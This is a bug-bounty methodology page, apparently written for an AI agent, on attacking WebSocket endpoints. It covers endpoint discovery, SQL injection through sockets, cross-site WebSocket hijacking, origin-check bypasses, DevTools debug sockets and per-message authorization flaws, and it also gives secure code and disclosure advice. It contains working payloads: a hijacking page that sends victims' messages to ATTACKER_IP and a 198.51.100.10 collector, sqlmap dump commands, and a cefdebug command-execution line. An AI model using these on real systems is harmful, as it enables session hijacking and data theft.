---
technology: "WebSocket"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
layer: ws/wss endpoint attack method (protocol-common; socket.io and DevTools subprotocols included)
version: 1.1
last-refresh: "2026-11-19"
source: "corpus-mined + upstream-verified (RFC 6455 semantics, sqlmap project changelog/PR #1206 for ws:// targets); CSWSH supplement 2026-11-19 verified against primary advisories (Schneider canonical writeup, GHSA/CVE records for PraisonAI, Next.js, Dozzle, websocket-driver)"
provenance: "chains distilled from the same gated corpus as the overview page; tool capabilities verified against project sources. CSWSH-depth supplement (2026-11-19) adds origin-validation bypass families, the PoC harness, message-level authz, and subprotocol/compression quirks, each re-verified against primary sources. Companion page: [[websocket]]."
---

# WebSocket — bug-bounty methodology

Companion overview: [[websocket]]. The protocol-common method: find the endpoint, learn its message grammar, then attack the handler behind it — with one browser-borne class (CSWSH) that has no HTTP equivalent.

## Phase 1 — Endpoint discovery

Ws servers don't live in the web root. Find them:

- **Page source / JS bundles**: grep rendered HTML and linked scripts for `new WebSocket(`, `io("ws://`, `ws://`, `wss://`, and `Sec-WebSocket`. The constructor argument is the full inventory.
- **Minified/obfuscated client JS**: run it through a JavaScript deobfuscator (several online tools exist); the deobfuscated output yields `const socket = io("ws://support.example.com", {...})` with the auth scheme attached.
- **nmap**: non-standard high ports listed as `unknown` or plain `http` (9091, 5789, 5000-style); anything that answers `GET /` with `Failed to open a WebSocket connection: did not receive a valid HTTP request.` is a raw ws server — the banner often names the library and version (Python `websockets/10.4` style `Server:` header).
- **Proxy captures**: Burp's WebSockets history tab records live frames once the browser client connects — the fastest way to learn the event grammar.
- **Compiled clients**: desktop apps embed ws URLs; for PyInstaller binaries, extract with pyinstxtractor, decompile the `.pyc` (unpyc3 or equivalent), and read `ws_host` constants. The `/version`-style subpaths found there are the server's real API.
- **On-host enumeration after a foothold**: `ss -tulnp` — loopback ws servers (127.0.0.1:5000-style) back internal services the web tier proxies to.

## Phase 2 — Learn the message grammar

Before injecting anything, capture both directions:

- **Passive**: proxy the browser session (Burp) and let the real client talk; note event names (`user_join`, `private_recv`) and JSON field names.
- **Active proxy**: point the client (or a copy of it) at a small Python proxy that prints both directions while forwarding to the real server:

```python
# ws proxy pattern: run local, repoint the client's host entry at it
python3 ws_proxy.py --host 127.0.0.1 --port 5789 --remote_url ws://198.51.100.10:5789
```

- **Minimal client** once you know the frames (the standard asyncio pattern with the `websockets` library):

```python
import asyncio, json, websockets
async def hello(msg):
    async with websockets.connect("ws://ws.example.com:5789/version") as ws:
        await ws.send(msg)
        return await ws.recv()
while True:
    print(asyncio.run(hello(json.dumps({"version": input()}))))
```

socket.io servers: connect with the socket.io JS client (or a Python socket.io client) instead of raw frames; the polling fallback (`GET /socket.io/?EIO=4&transport=polling&sid=...`) lets you speak events over plain HTTP when sockets are blocked.

## Phase 3 — Injection behind the socket

The handler on the other end is usually an unhardened query or deserializer.

- **Blind boolean SQLi**: id/ticket-check patterns that answer only "valid/invalid". Test `OR 1=1` first through the socket; if validity flips, it's injectable.
- **Automated**: sqlmap speaks ws URLs natively (websocket support merged into the project in 2015; current dev lists it as standard-library-only). Point it straight at the socket with the JSON body and a `*` marker:

```bash
sqlmap -u "ws://soc.example.com:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
sqlmap -u "ws://soc.example.com:9091" --data '{"id": "*"}' -D target_db --dump --batch
```

- **Manual UNION through a field**: for SQLite backends reach for `sqlite_master` — enumerate tables by `rootpage` (`" UNION SELECT name,2,3,4 FROM sqlite_master WHERE rootpage = N-- -`), pull the DDL with `sql` instead of `name`, then dump. (Dialect fingerprint: `version()`/`@@version` erroring while `sqlite_version()` returns = SQLite.)
- **Deserialization through frames**: .NET ws services that JSON-deserialize messages with `TypeNameHandling` set (Auto/AutoWithGenerics in Newtonsoft.Json) accept `$type` in the JSON — a payload naming file-reading types yields arbitrary file read; escalate from there.

## Phase 4 — Origin and cross-site abuse (CSWSH)

Test whether the handshake enforces `Origin`:

1. From any other origin you control (a local HTML page is enough), open `new WebSocket("ws://target.example.com/ws/")` and include credentials (`websocket = new WebSocket(...)` from a page where the victim is logged in — cookies ride automatically for same-site cookies; use `wss://` against TLS hosts).
2. If the connection succeeds and the first message returns authenticated data, it is hijackable.

Weaponization (requires victim interaction, delivered via XSS, host-header-injection password-reset flows, or any HTML injection):

```html
<script src="http://ATTACKER_IP/socket.io.js"></script>
<script>
  var socket = io.connect("http://chat.example.com");
  socket.emit("user_join", { username: "Admin" });          // join as the victim
  socket.on("private_recv", (data) => {                     // harvest their messages
    navigator.sendBeacon("http://ATTACKER_IP/loot", JSON.stringify(data));
  });
</script>
```

Discovery order for the event names: register two of your own accounts, send a private message between them, and read the event in the proxy capture before crafting the payload.

## Phase 5 — Handshake auth weaknesses

- Tokens attached at connect time usually come from cookies in the client (`auth: {token: getCookie("SESSION")}`) — the socket is only as strong as that cookie; steal it and you hold the socket with no second factor.
- Configurable auth backends: source review sometimes shows the auth server (LDAP URL) is a setting, not a constant — repoint it at a server you run and the app authenticates your users (run the client locally to drive it).
- No per-message auth: a join event that names another user (`user_join {username: "Admin"}`) is honored because the handler trusts the established socket.

## Phase 6 — Loopback and DevTools sockets

With any shell on the host, enumerate `ss -tulnp` for loopback ws listeners:

- **CEF/Electron remote debugging**: ws URLs with UUID paths on 127.0.0.1. The cefdebug tool (built from the public research on CEF/VSCode debuggers being enabled by default) lists them and executes JavaScript in the application:

```bash
./cefdebug --url ws://127.0.0.1:24891/<uuid> \
  --code "process.mainModule.require('child_process').exec('cmd payload')"
```

That is code execution in the desktop app's context — no authentication exists on the debug socket.
- **Internal service sockets**: ws://127.0.0.1:5000-style endpoints behind web tiers speak small JSON command grammars (`{"RemoveOrder": ...}`) — replay them with the Python client from Phase 2 against the loopback address once you have a foothold.

## Phase 7 — SSRF-to-WebSocket

When the only path to an internal ws service is an SSRF in the public tier:

- Fetch the client source through the SSRF (download links like `/files/client_source.zip` are gold) and study it offline.
- Cross-protocol tricks let an HTTP-speaking SSRF reach a ws port; otherwise repoint a local copy of the client (hosts entry or its `ws_host` constant) at the internal address through whatever forwarding the SSRF gives you.

## Tool quick reference

- Discovery: nmap full-port plus the JS greps; Burp's WebSockets history; pyinstxtractor + a Python decompiler for packaged clients.
- Clients/proxies: the Python `websockets` library (asyncio pattern above), the `websocket` client library (`ws = websocket.WebSocket(); ws.connect("ws://...")`), socket.io JS/Python clients.
- Injection: sqlmap against `ws://` targets; hashcat/john for hashes dumped through the socket.
- Loopback abuse: cefdebug for CEF/Electron debug sockets.

## Disclosure notes

CSWSH reports must show the missing `Origin` check (a capture from an unrelated origin), not just the exploit page. SQLi-through-websocket reports should include the exact JSON frame and the boolean flip. Never ship the harvested session cookies or private messages in the write-up — redact the frames.

---

## Supplement — CSWSH depth, origin-validation bypasses, and WS-layer quirks (added 2026-11-19)

*Source: Christian Schneider's canonical CSWSH writeup (2013, CWE-1385 update) and the PortSwigger/pentest-tools method; origin-bypass families and the compression/authz quirks re-verified against primary advisories (CVE-2026-55536 PraisonAI, CVE-2026-27977 Next.js, CVE-2026-44985 Dozzle, CVE-2026-54464 websocket-driver). Extends Phase 4 (CSWSH) and Phase 5 (handshake auth); nothing above was rewritten. This is the depth pass on the one WebSocket bug class with no HTTP equivalent — treat it as the expanded Phase 4.*

### S.1 — Why CSWSH is the payout class (the target profile)

Cross-Site WebSocket Hijacking is the highest-signal WebSocket finding because it inverts the thing every web developer learned from CSRF. CSRF is *write-only*: a malicious page can fire a request with the victim's cookies but cannot read the response (the Same-Origin Policy hides it). **The WebSocket handshake is not restrained by the Same-Origin Policy at all.** It is an ordinary `GET` with an `Upgrade` header; the browser attaches the victim's cookies and HTTP-auth automatically, and once the socket is open the attacker has a full *read-and-write* duplex channel into the victim's authenticated session. That is why Schneider's original framing — later formalized as **CWE-1385, "Missing Origin Validation in WebSockets"** — calls it hijacking, not forgery.

The inversion that makes it exploitable: CORS and WebSockets both carry the `Origin` header, but their **defaults are opposite**. With CORS the browser *hides* the response unless the server opts the origin in. With WebSockets the connection is *established* even when the server sends no approval header — the server has to actively read `Origin` and reject, or the handshake succeeds from anywhere. Nothing in RFC 6455 requires the server to check it; §4.2 leaves client authentication entirely to the application.

The target profile that makes a WS endpoint hijackable — all four must hold:

| Condition | How to confirm | Where it breaks |
|---|---|---|
| Auth rides on the handshake automatically | session is a **cookie** (or HTTP-auth), not a token the JS must attach | token-in-header / token-in-first-frame auth is immune — the attacker's page can't read the token |
| Cookie is sent cross-site | cookie lacks `SameSite=Strict/Lax`, **or** attacker controls a sibling subdomain of the same site (see S.3) | `SameSite=Strict` on the session cookie kills most CSWSH outright |
| Server does not validate `Origin` | replay the handshake with a foreign `Origin` and it still returns `101` | strict equality check on a server-owned allowlist |
| The socket returns or acts on authenticated data | first server→client frame carries the victim's data, or a client→server command mutates their state | a socket that authenticates *again* per message (S.5) limits impact |

The single most important consequence: **`SameSite` is a `site` control, not an `origin` control.** It is evaluated at the registrable domain (eTLD+1) level. A cookie set for `app.example.com` with `SameSite=Lax` is still attached when `evil.example.com` opens a WebSocket to `app.example.com`, because both are the same *site*. Any XSS, subdomain takeover, or attacker-hosted content on *any* `*.example.com` is therefore a CSWSH launch point against a `SameSite=Lax` session — this is exactly the Dozzle failure (S.4). Note the handshake also needs no preflight and no CSRF token: it is a "simple" cross-site navigation-class request.

### S.2 — The PoC harness

The report is the proof, and for CSWSH the proof is a page served from an origin you control that opens the socket, receives authenticated data, and exfiltrates it to your collector. The minimal, self-contained harness (host it on `http://198.51.100.10/poc.html`, send the victim the link):

```html
<!-- CSWSH PoC — demonstrates the missing Origin check, nothing more -->
<script>
  // wss:// against TLS hosts; the victim's cookies ride automatically because
  // this page is cross-origin and the handshake is not SOP-restrained.
  var ws = new WebSocket("wss://chat.example.com/ws/");
  ws.onopen = function () {
    ws.send("READY");                         // whatever frame requests history
  };
  ws.onmessage = function (event) {
    // exfil to the collector. no-cors: we only need the request to leave,
    // we never read the collector's response, so SOP on the POST is irrelevant.
    fetch("https://198.51.100.10/loot", {
      method: "POST",
      mode: "no-cors",
      body: event.data
    });
  };
  ws.onerror = function (e) { /* handshake rejected => Origin probably checked */ };
</script>
```

For socket.io targets, load the matching client and emit the discovered event instead of a raw frame (the Phase 4 `io.connect(...)` form). Two discipline points for an authorized program:

- **Prove the control gap, not the data.** The reportable fact is "a page on an unrelated origin completed the handshake and received authenticated frames." Capture *one* frame as evidence, redact its contents, and stop. Do not stream the victim's whole message history to your collector — `event.data` in the PoC is there to demonstrate reachability, not to harvest.
- **Evidence pair.** Ship (1) the raw handshake showing your foreign `Origin:` header and the server's `101 Switching Protocols`, and (2) a single redacted frame. The handshake capture is what proves the vulnerability; the exploit page alone does not (a triager needs to see the server *accepted* the origin).

The handshake capture that belongs in the report — note the attacker `Origin`, the victim `Cookie` riding along, and the server's acceptance:

```http
GET /ws/ HTTP/1.1
Host: chat.example.com
Origin: https://evil.example                       <- unrelated origin, attacker-controlled
Cookie: SESSION=<victim-session-redacted>           <- rode along automatically (cross-site)
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

HTTP/1.1 101 Switching Protocols                    <- server ACCEPTED the foreign origin => CSWSH
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

A server that validates `Origin` answers the same request with `403 Forbidden` (or closes before `101`); that negative capture is your control case, and a report is strongest when it shows both — foreign origin rejected on the real UI's domain, accepted (or the check bypassed per S.3) on the crafted one.

### S.3 — Origin-validation bypass families

When the server *does* read `Origin`, the bug moves from "no check" to "broken check." The validation is almost always string manipulation on an attacker-supplied header, and it fails in predictable families. Probe each by replaying the handshake (Burp Repeater clone, or `websocat --origin`, S.7) with the crafted `Origin` and watching for `101`:

| Family | Crafted `Origin` against `app.example.com` | Root cause |
|---|---|---|
| **Null origin** | `Origin: null` | Sandboxed iframe (`<iframe sandbox>`), `data:`/`file:` document, or a cross-site redirect emits `Origin: null`; code that treats `null` as "same-origin / internal" or short-circuits on it accepts it. **CVE-2026-27977** (Next.js) is exactly this: `next dev` treated `Origin: null` as a bypass even with `allowedDevOrigins` set. |
| **Suffix / `endsWith`** | `https://app.example.com.evil.net` | Check is `origin.endsWith("example.com")` or a domain-suffix test; the attacker registers `…example.com.evil.net` so the allowed string sits at the end. |
| **Prefix / `startsWith`** | `https://app.example.com.evil.net` (same string, different check) or `https://app.example.com@evil.net` | Schneider's canonical bypass: embed the expected origin as a prefix. Userinfo (`@`) tricks parsers that read up to the `@`. |
| **Substring / `includes`** | `https://evil-app.example.com.attacker.net`, `https://exampleXcom.evil.net` | `origin.includes("example.com")` — membership instead of equality. Classic in hand-rolled Node checks. |
| **Unanchored regex** | `https://app.example.com.evil.net` (regex missing `$`) | Pattern like `/https:\/\/.*\.example\.com/` with no end-anchor matches a longer attacker string. **CVE-2026-55536** (PraisonAI, CVSS 9.1, patch-bypass of CVE-2026-40289): `re.match()` on unanchored `chrome-extension://[a-z0-9]{32}` — `re.match` anchors only the *start*, so any trailing bytes pass. Fixed in 4.6.58. The two-sided lesson: unanchored regex **and** `re.match`-style start-only matching both leave the tail open. |
| **Subdomain wildcard / same-site** | `https://evil.example.com` (a subdomain you control or took over) | Allowlist permits `*.example.com`; any subdomain — including one you obtained via subdomain takeover — passes. Combined with `SameSite=Lax` (S.1) this needs no origin bug at all. |
| **Scheme / case quirks** | `Origin: HTTPS://App.Example.Com`, `http://app.example.com` vs `https://…` | Case-sensitive compare the browser doesn't honor; or an http-origin accepted against an https allowlist (mixed-scheme, see S.6). |
| **Proxy overwrite** | (no crafted header) | A reverse proxy rewrites or strips `Origin` before the app sees it, so the app's check runs against a value the attacker never set — the check is dead and the app can't tell. Detect by diffing what you send vs. what a reflected error shows. |

The code that produces each family, and the one check that doesn't break — use these to explain root cause in the report and to recognize the bug when source is in scope:

```javascript
// VULNERABLE — every one of these is a shipped CSWSH bug
function originOk(origin) {
  if (origin === "null") return true;              // null-origin bypass (CVE-2026-27977 shape)
  if (origin.endsWith("example.com")) return true; // suffix: app.example.com.evil.net passes
  if (origin.includes("example.com")) return true; // substring: exampleXcom.evil.net passes
  if (/https:\/\/.*\.example\.com/.test(origin))    // unanchored regex: ...example.com.evil.net passes
    return true;                                    // (re.match / startsWith anchor only the START — CVE-2026-55536)
  return false;
}
// ...and the Go archetype (CVE-2026-44985, Dozzle): origin check deleted outright
//   upgrader := websocket.Upgrader{ CheckOrigin: func(r *http.Request) bool { return true } }

// SECURE — exact equality against a server-owned allowlist; no string surgery on attacker input
const ALLOWED = new Set(["https://app.example.com", "https://admin.example.com"]);
function originOk(origin) { return ALLOWED.has(origin); }   // and reject Origin: null explicitly
```

The fix is never a cleverer pattern — it is dropping pattern-matching entirely for set-membership equality, plus a session-bound random token checked on the handshake (so a stolen cookie alone is not enough) for anything high-value.

The decision point after a bypass: a `101` from a foreign origin is the finding, but only if S.1's other three conditions hold. If the socket authenticates per-message (S.5) or the session cookie is `SameSite=Strict`, downgrade the severity and say so — a broken `Origin` check on a socket that re-checks every frame is Low/hardening, not High.

### S.4 — Verified CSWSH / origin CVE table

Real advisories to pattern-match against; use them as "this exact shape has shipped in production" evidence in reports. No invented entries.

| Project | CVE / GHSA | Mechanism | Fixed |
|---|---|---|---|
| PraisonAI Browser Server | **CVE-2026-55536** (CVSS 9.1), GHSA-6g6r-q6gw-w8fg | Unanchored `re.match()` on `chrome-extension://[a-z0-9]{32}` before `websocket.accept()` — trailing chars pass; drives `start_session` browser-automation commands. Patch-bypass of CVE-2026-40289. | 4.6.58 |
| Next.js (`next dev`) | **CVE-2026-27977** (Moderate), GHSA-jcc7-9wpm-mj36, CWE-1385 | `Origin: null` treated as a bypass case on internal dev endpoints even with `allowedDevOrigins` configured; dev-mode only, not `next start`. Workaround: reject `Origin: null` upgrades at the proxy. | 16.1.7 |
| Dozzle | **CVE-2026-44985** (High), GHSA-j643-x8pv-8m67, CWE-346 | WS upgrader for `/exec` and `/attach` sets `CheckOrigin: func(r *http.Request) bool { return true }` — origin check disabled; `jwt` cookie is `SameSiteLaxMode`, so a sibling `*.example.com` page opens an interactive container shell as the victim. Preconditions: `DOZZLE_ENABLE_SHELL=true`, simple auth, victim logged in. | none listed — remove the custom `CheckOrigin` |
| MeshCentral | **CVE-2026-66420** (CVSS 8.6) | Origin-validation bypass enabling CSWSH on self-signed-certificate deployments. | see advisory |

The Dozzle row is the archetype the whole supplement is about: a framework default (`gorilla/websocket`'s upgrader rejects cross-origin by default) was *overridden* to `return true`, and the `SameSite=Lax` cookie did the rest. Grep any Go WS target's source (when in scope) for `CheckOrigin` returning `true` unconditionally; grep Node `ws`/socket.io for a missing or permissive `verifyClient`/`checkOrigin`.

### S.5 — Authorization over the socket (after the handshake)

The handshake authenticates a *connection*; it does not authorize the *actions* that flow over it. Two distinct gaps, both common because the socket surface is invisible to REST-focused reviewers:

- **Role check only at upgrade.** The server verifies `is_admin` (or a scope) when the socket opens, then trusts the socket for its lifetime. Test: open the socket as a low-privilege user, then send a privileged command frame (`{"action":"deleteUser","id":...}`, an admin event name). If the role was checked only at upgrade, the handler executes it. This is BFLA transposed onto frames.
- **No per-message object authorization.** Even a correctly-authenticated socket is BOLA-prone per frame: a `{"event":"read","room":"B-private"}` or `user_join {username:"Admin"}` (Phase 4/5) is honored because the handler trusts the established socket and never re-checks that *this* user may touch *that* object. Do the Phase 3-style two-account swap **inside** the frame grammar: connect as A, reference B's object IDs in frames, see what comes back.

The two failure shapes in code, and the fix that closes both:

```python
# VULNERABLE — role checked once at accept; every later frame trusts the socket
@app.websocket("/ws")
async def ws(sock: WebSocket):
    user = await authenticate(sock)              # cookie/handshake auth, ONCE
    await sock.accept()
    async for raw in sock.iter_text():
        msg = json.loads(raw)
        if msg["action"] == "deleteUser":        # no re-check: a normal user's socket
            await db.users.delete(msg["id"])     # can issue admin frames (BFLA)
        elif msg["action"] == "read":
            await sock.send_json(await db.get(msg["room"]))  # any room id (BOLA per-frame)

# SECURE — authorize the ACTION and the OBJECT on every frame, against this user
@app.websocket("/ws")
async def ws(sock: WebSocket):
    user = await authenticate(sock)
    await sock.accept()
    async for raw in sock.iter_text():
        msg = json.loads(raw)
        if msg["action"] == "deleteUser":
            if "admin" not in user.roles:        # function-level check per frame
                await sock.send_json({"error": "forbidden"}); continue
            await db.users.delete(msg["id"])
        elif msg["action"] == "read":
            room = await db.rooms.get(msg["room"])
            if not room or room.owner_id != user.id:   # object-level check per frame
                await sock.send_json({"error": "not found"}); continue
            await sock.send_json(room.data)
```

The sharpest variant — **processing before auth completes**: some servers accept and act on frames sent in the window between `101` and the application's own auth step (a token expected in the first frame). Send your command frame *immediately* on `onopen`, before any auth frame. If it executes, authentication is decorative. Note this for query-string / first-frame auth designs especially.

Report framing: a message-level authz gap is independent of CSWSH. You can have a perfectly validated `Origin` and still have a socket that lets any authenticated user issue admin frames — and you can have CSWSH on a socket that *does* re-check every frame (lower impact). Test and report them separately.

### S.6 — Subprotocol and compression quirks

- **`permessage-deflate` (RFC 7692) — the CRIME-style caveat, stated honestly.** CRIME/BREACH leak secrets when attacker-controlled data and a secret share one compressed stream and the attacker can observe the compressed *length*. Over WebSockets the pieces are *present* — `permessage-deflate` compresses frame payloads, and an attacker who can inject text into a frame that also carries a secret has the ingredients — but the browser exposes **no compressed-length oracle** for WS frames the way a cross-site HTTP response size does for BREACH, so a practical CSWSH-plus-compression exfil is not a demonstrated, off-the-shelf attack. **Do not claim a working compression side-channel without a measured length oracle.** What *is* real and shipping in this extension is the resource-exhaustion class: the size-limit check runs on the **compressed** frame length, not the **inflated** size, so a small compressed frame inflates past the configured cap — a decompression bomb. **CVE-2026-54464** (websocket-driver, fixed 0.8.1): max-message-size enforced against frame-length headers (compressed) instead of post-inflate length; the fix moves the check to after extensions decompress. Sibling advisories hit `bandit` (Erlang) and uWebSockets with the same before-the-length-check inflate. If `Sec-WebSocket-Extensions: permessage-deflate` is negotiated, a single highly-compressible frame (long run of one byte) that inflates to hundreds of MB is a one-request DoS probe — send **one**, watch latency/memory, stop.
- **Subprotocol smuggling / JSON message injection.** When the server frames messages with a delimiter and reflects attacker-controlled fields into the same frame, injection survives if the delimiter does. If a username or message body is concatenated into a JSON or line-delimited frame without escaping, inject the delimiter (`"`, `}`, newline, the subprotocol's separator) to break out of your field and forge sibling fields — the frame-level analogue of HTTP response splitting. Classic shape: a chat server builds `{"from":"<you>","msg":"<text>"}` by string-concatenation; set your display name to `x","role":"admin` and the server emits a frame where `role` is now a top-level field the downstream parser trusts. Test by sending structural characters in every field that gets echoed and reading the raw frame the server produces.
- **`Sec-WebSocket-Protocol` echoing.** A server that blindly reflects the client's requested subprotocol back can be coaxed into advertising a protocol the client then speaks in a weaker mode; low-signal, but note mismatches where the negotiated subprotocol changes the framing/auth the handler applies.

### S.7 — ws:// on https pages, and token-in-query-string leakage

Two findings that need no handshake trickery — just read the client:

- **Mixed-content `ws://` on an `https://` page.** A page loaded over `https://app.example.com` that opens `new WebSocket("ws://…")` is mixed active content; modern browsers *block* it, so the feature silently breaks — but the finding is the cleartext intent: the client was written to speak plaintext WS, and any context that reaches the `ws://` endpoint (a native app, an older browser, a downgrade) sends frames — including the auth token — in the clear on the wire. Grep rendered HTML and JS bundles for `ws://` string literals on TLS origins; report the cleartext channel and the downgrade exposure even where the browser blocks it today.
- **Token in the query string.** Browsers cannot set custom headers on a WebSocket handshake (the JS `WebSocket` constructor takes only URL and subprotocol), so apps that can't use cookies routinely push the auth token into the URL: `wss://app.example.com/ws?token=…` or `?access_token=…`. The token then lands in proxy and server access logs, browser history, and — if the client ever navigates — `Referer` headers. Grep captured traffic and frontend JS for `?token=`/`?access_token=` on WS URLs; where you find one, enumerate every *other* place that same token value appears (logs you can reach, history, third-party beacons). A query-string WS token is reportable on its placement alone, before any token-validation flaw. (This is the same anti-pattern Phase 5's handshake-auth notes flag; here it is the *reason* query-string auth exists on sockets — the header restriction — and that reason doesn't excuse the leakage.)

### S.8 — Tools, with expected output

- **`websocat`** — the Swiss-army WS client; best for scripted handshake probing. Spoof the origin and watch the handshake:
  ```bash
  # -v prints the handshake both directions; --origin sets the Origin header
  websocat -v --origin https://evil.example "wss://chat.example.com/ws/"
  # expected on a hijackable server: the request carries your foreign Origin and
  # the server still answers "101 Switching Protocols", then frames flow.
  # expected on a protected server: the connection closes on a 403, and -v shows
  # the server's rejection before any frame.
  #
  # add an auth cookie to prove the session rides (authorized testing only):
  websocat -v -H 'Cookie: SESSION=<victim-session>' "wss://chat.example.com/ws/"
  ```
- **`wscat`** — the Node reference client; interactive, good for hand-driving the frame grammar once you know it:
  ```bash
  # -o/--origin sets Origin; -H adds a header; then type frames at the > prompt
  wscat -c "wss://chat.example.com/ws/" -o https://evil.example
  # expected: "Connected (press CTRL+C to quit)" + a '>' prompt on success;
  #           "error: Unexpected server response: 403" if the origin is rejected.
  wscat -c "wss://chat.example.com/ws/" -H 'Authorization: Bearer <t>'
  ```
- **Burp — WebSockets history + Repeater clone.** The canonical manual CSWSH test: Proxy → HTTP history shows the `101 Switching Protocols` handshake; Proxy → WebSockets history shows live frames. Send a frame to Repeater, use **Edit → Clone** to duplicate the connection, change the `Origin` header on the cloned handshake to `https://evil.example`, and click **Connect**. Expected: a hijackable server re-establishes the socket and your cloned connection receives frames; a protected server fails the reconnect. This is the capture that belongs in the report (it shows the server *accepting* the foreign origin).
- **Browser DevTools — the WS frames tab.** Network → click the WS request → **Messages** tab (Chrome) / **Response**/frames (Firefox) lists every frame both directions with direction arrows and timestamps — the fastest way to learn the live event grammar before writing the harness (the browser-native equivalent of Burp's WebSockets history). Green/outgoing vs. incoming arrows separate client frames from server frames at a glance.

### S.8b — Rating a confirmed CSWSH (severity adjudication)

A `101` from a foreign origin is necessary but not sufficient for a high payout — the severity is set by *what the socket then lets the attacker do* and *how much the other S.1 conditions help or hurt them*. Adjudicate against this ladder, and state in the report which rung you landed on and why:

| Rung | Situation | Typical severity |
|---|---|---|
| Top | Socket exposes state-changing admin actions (container shell, account mutation) to the hijacked session; cookie is `SameSite=None`/absent so any attacker page works | Critical (the Dozzle shape) |
| High | Socket returns the victim's private data (messages, PII, tokens) read-only; cross-origin page is enough | High |
| Medium | Exploit needs a *same-site* foothold (`SameSite=Lax` + an XSS/takeover on some `*.example.com`) rather than any origin | Medium–High (note the extra precondition) |
| Low | `Origin` check is broken but the socket re-authorizes every frame (S.5), or the socket carries nothing authenticated | Low / hardening |
| Info | `Origin` unvalidated but `SameSite=Strict` on the session cookie blocks the cross-site handshake in current browsers | Info (defense-in-depth gap) |

The two downgraders triagers will raise if you don't: `SameSite=Strict` (the handshake never carries the cookie cross-site, so the "hijack" can't authenticate) and per-frame re-authorization (S.5). Address both pre-emptively — confirm the cookie's `SameSite` value from the `Set-Cookie` header and confirm whether a second frame from a hijacked socket actually returns data, and put both results in the report.

### S.9 — CTF notes

CSWSH and its cousins show up in web CTFs in a recognizable, compressed form — and what the box tests is usually the *inverse* of what a bounty program cares about:

- **The classic box shape:** an admin/bot visits a URL you submit (the "report to admin" function). That bot *is* the victim browser with the admin's cookie. The intended path is almost always: your submitted page opens a WebSocket (or an iframe that does) to the challenge's own origin, the bot's cookie rides the handshake, and the socket hands back a flag frame or lets you issue an admin command. Recognize the "admin bot + cookie + WS endpoint" combination and reach for the S.2 harness first.
- **What differs from a bounty:** in a CTF the `Origin` check is usually either absent (the whole point) or a deliberately-broken family from S.3 you're meant to bypass — the challenge *wants* a specific bypass, so enumerate S.3 systematically rather than looking for logic depth. There's no authorization/rules-of-engagement concern: you exfiltrate the flag in full, point the collector at your own `requestbin`/webhook, and stream everything — the opposite of the bounty discipline in S.2. And the cookie is typically plain `SESSION`/`flag`-bearing with no `SameSite`, so you rarely need the same-site subdomain trick; a cross-origin page is enough.
- **Message-grammar CTFs:** many challenges put the bug *behind* the socket (S.5/S.6) — a command frame that trusts a client-supplied `role`, a JSON-injection via an un-escaped username, a per-message authz gap you reach by connecting as a normal user and sending the admin event. Capture the grammar in the DevTools frames tab, then script the malicious frame with `websocat`.

### S.10 — References (supplement)

- Christian Schneider, "Cross-Site WebSocket Hijacking (CSWSH)" (canonical; CWE-1385 update) — https://christian-schneider.net/blog/cross-site-websocket-hijacking/
- Pentest-Tools, "Cross-site WebSocket hijacking: understanding and exploiting CSWSH" — https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh
- CWE-1385, Missing Origin Validation in WebSockets — https://cwe.mitre.org/data/definitions/1385.html
- CWE-346, Origin Validation Error — https://cwe.mitre.org/data/definitions/346.html
- CVE-2026-55536, PraisonAI Browser Server unanchored-regex origin bypass (patch-bypass of CVE-2026-40289) — GHSA-6g6r-q6gw-w8fg
- CVE-2026-27977, Next.js `Origin: null` bypass of `allowedDevOrigins` — https://github.com/vercel/next.js/security/advisories/GHSA-jcc7-9wpm-mj36
- CVE-2026-44985, Dozzle CSWSH on `/exec` and `/attach` (CheckOrigin → true) — https://github.com/amir20/dozzle/security/advisories/GHSA-j643-x8pv-8m67
- CVE-2026-54464, websocket-driver permessage-deflate size-limit bypass — https://github.com/faye/websocket-driver-ruby/security/advisories/GHSA-33ph-fccm-39pj
- CVE-2026-66420, MeshCentral origin-validation bypass (self-signed deployments) — VulnCheck advisory
- RFC 6455 §4.2 (handshake, client auth left to the server) and RFC 7692 (`permessage-deflate`) — https://www.rfc-editor.org/rfc/rfc6455 / https://www.rfc-editor.org/rfc/rfc7692
- websocat — https://github.com/vi/websocat ; wscat — https://github.com/websockets/wscat

*Supplement compiled 2026-11-19 (model: claude-opus-4-8). CSWSH mechanism and PoC structure from Schneider's canonical writeup and the pentest-tools/PortSwigger method; origin-bypass families corroborated against the four CVE advisories above, each re-verified at a primary GHSA/CVE source; permessage-deflate CRIME caveat stated as theoretical-without-oracle per the absence of a demonstrated WS compressed-length side channel in current sources. No CVE, version, or flag in this supplement is invented; where a primary source could not confirm a detail (MeshCentral mechanism, websocket-driver exact lower-bound version), the text says so.*
